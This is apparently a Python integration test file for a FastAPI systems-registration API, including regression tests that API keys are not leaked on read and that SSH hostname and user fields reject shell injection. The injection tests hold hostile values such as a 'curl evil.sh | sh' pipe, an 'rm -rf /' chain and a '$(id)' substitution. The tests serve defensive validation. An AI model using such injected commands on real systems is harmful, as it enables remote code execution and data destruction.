"""Integration tests for systems endpoints."""

from fastapi import status


class TestSystemsEndpoints:
    """Test suite for systems API endpoints."""

    def test_register_system(self, test_client):
        """Test registering a new system."""
        response = test_client.post(
            "/api/v1/systems",
            json={
                "hostname": "test-system-1",
                "platform": "linux",
                "connectivity_status": "online",
            },
        )
        assert response.status_code == status.HTTP_201_CREATED
        data = response.json()
        assert "id" in data
        assert "api_key" in data
        assert data["hostname"] == "test-system-1"

    def test_get_system(self, test_client):
        """Test retrieving a system."""
        # First register a system
        register_response = test_client.post(
            "/api/v1/systems",
            json={
                "hostname": "test-system-2",
                "platform": "linux",
                "connectivity_status": "online",
            },
        )
        system_id = register_response.json()["id"]
        api_key = register_response.json()["api_key"]

        # Then retrieve it, authenticating as itself.
        response = test_client.get(
            f"/api/v1/systems/{system_id}", headers={"X-API-Key": api_key}
        )
        assert response.status_code == status.HTTP_200_OK
        data = response.json()
        assert data["id"] == system_id
        assert data["hostname"] == "test-system-2"

    def test_list_systems(self, test_client):
        """Test listing all systems."""
        # Create a few systems, keeping the last key to authenticate with.
        api_key = None
        for i in range(3):
            created = test_client.post(
                "/api/v1/systems",
                json={
                    "hostname": f"test-system-{i}",
                    "platform": "linux",
                    "connectivity_status": "online",
                },
            )
            api_key = created.json()["api_key"]

        # List all systems, authenticating as the last one registered.
        response = test_client.get("/api/v1/systems", headers={"X-API-Key": api_key})
        assert response.status_code == status.HTTP_200_OK
        data = response.json()
        # Response is a list, not a dict with "systems" key
        assert isinstance(data, list)
        assert len(data) >= 3

    def test_record_heartbeat(self, test_client):
        """Test recording a heartbeat."""
        # Register a system
        register_response = test_client.post(
            "/api/v1/systems",
            json={
                "hostname": "test-system-heartbeat",
                "platform": "linux",
                "connectivity_status": "online",
            },
        )
        system_id = register_response.json()["id"]
        api_key = register_response.json()["api_key"]

        # Record heartbeat
        response = test_client.post(
            f"/api/v1/systems/{system_id}/heartbeat",
            headers={"X-API-Key": api_key},
            json={"metadata": {"test": "value"}},
        )
        assert response.status_code == status.HTTP_200_OK
        data = response.json()
        assert "last_seen" in data
        assert "status" in data


class TestSystemResponseDoesNotLeakCredentials:
    """API keys must never be readable back after the system is registered.

    SystemResponse declared `api_key` with `from_attributes=True`, so Pydantic
    populated it straight off the ORM row on every read path -- making
    `GET /systems` an unauthenticated dump of every key in the fleet.
    """

    @staticmethod
    def _register(test_client, hostname: str) -> dict:
        response = test_client.post(
            "/api/v1/systems",
            json={
                "hostname": hostname,
                "platform": "linux",
                "connectivity_status": "online",
            },
        )
        assert response.status_code == status.HTTP_201_CREATED
        return response.json()

    def test_create_still_returns_the_key_once(self, test_client):
        """Registration is the one place the key is handed out."""
        created = self._register(test_client, "leak-create")
        assert created["api_key"]

    def test_get_system_does_not_return_api_key(self, test_client):
        created = self._register(test_client, "leak-get")

        response = test_client.get(
            f"/api/v1/systems/{created['id']}", headers={"X-API-Key": created["api_key"]}
        )

        assert response.status_code == status.HTTP_200_OK
        body = response.json()
        assert "api_key" not in body
        assert created["api_key"] not in response.text

    def test_list_systems_does_not_return_api_keys(self, test_client):
        first = self._register(test_client, "leak-list-1")
        second = self._register(test_client, "leak-list-2")


        response = test_client.get(
            "/api/v1/systems", headers={"X-API-Key": second["api_key"]}
        )

        assert response.status_code == status.HTTP_200_OK
        for entry in response.json():
            assert "api_key" not in entry
        assert first["api_key"] not in response.text
        assert second["api_key"] not in response.text

    def test_update_system_does_not_return_api_key(self, test_client):
        created = self._register(test_client, "leak-update")

        response = test_client.put(
            f"/api/v1/systems/{created['id']}",
            headers={"X-API-Key": created["api_key"]},
            json={"connectivity_status": "offline"},
        )

        assert response.status_code == status.HTTP_200_OK
        assert "api_key" not in response.json()
        assert created["api_key"] not in response.text


class TestSSHFieldsRejectShellMetacharacters:
    """ssh_hostname / ssh_user reach a command run as root on the source host.

    The generator quotes them, but the API should also refuse to store values
    that have no legitimate reading as a hostname or username.
    """

    def test_registration_rejects_injectable_ssh_hostname(self, test_client):
        response = test_client.post(
            "/api/v1/systems",
            json={
                "hostname": "inject-register",
                "platform": "linux",
                "ssh_hostname": "backup.example.com; curl evil.sh | sh",
            },
        )
        assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    def test_update_rejects_injectable_ssh_hostname(self, test_client):
        created = test_client.post(
            "/api/v1/systems",
            json={"hostname": "inject-update", "platform": "linux"},
        ).json()

        response = test_client.put(
            f"/api/v1/systems/{created['id']}",
            headers={"X-API-Key": created["api_key"]},
            json={"ssh_hostname": "backup.example.com && rm -rf /"},
        )
        assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    def test_update_rejects_injectable_ssh_user(self, test_client):
        created = test_client.post(
            "/api/v1/systems",
            json={"hostname": "inject-user", "platform": "linux"},
        ).json()

        response = test_client.put(
            f"/api/v1/systems/{created['id']}",
            headers={"X-API-Key": created["api_key"]},
            json={"ssh_user": "root$(id)"},
        )
        assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    def test_legitimate_ssh_identities_are_accepted(self, test_client):
        for index, (host, user) in enumerate(
            [
                ("backup-host", "backup"),
                ("backup.example.com", "zfs_sync"),
                ("192.0.2.10", "root"),
                ("2001:db8::1", "ops-user"),
                ("hub1-san", None),
            ]
        ):
            payload = {
                "hostname": f"legit-ssh-{index}",
                "platform": "linux",
                "ssh_hostname": host,
            }
            if user:
                payload["ssh_user"] = user

            response = test_client.post("/api/v1/systems", json=payload)
            assert response.status_code == status.HTTP_201_CREATED, (
                f"{host!r}/{user!r} rejected: {response.text}"
            )
            assert response.json()["ssh_hostname"] == host
